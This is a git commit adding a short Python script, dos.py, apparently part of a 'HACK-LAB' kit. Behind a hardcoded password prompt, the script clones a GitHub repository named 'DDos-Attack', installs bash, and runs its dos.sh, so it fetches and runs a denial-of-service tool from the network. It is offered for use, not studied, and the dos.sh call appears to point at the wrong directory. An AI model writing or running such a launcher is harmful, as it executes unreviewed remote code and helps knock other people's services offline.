a79d89ce8c9baea84eb3386eaa35044402f27bd1
NF-attacker <59114717+nazimtch@users.noreply.github.com>
2021-10-30 23:27:35 +0200

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,9 @@
+password = input ("ENTER THE FIRST PASSWORD USED TO OPEN HACK-LAB : ")
+if password == ("hashmd5tryagainn") :
+    import os 
+    os.system ("git clone https://github.com/Ha3MrX/DDos-Attack")
+    os.system ("apt install bash")
+    os.system ("bash dos.sh")
+else :
+    print ("WRONG PASSWORD PLEASE CONTACT THE CODDER ")
+    print ("INSTAGRAM : nazimtch")
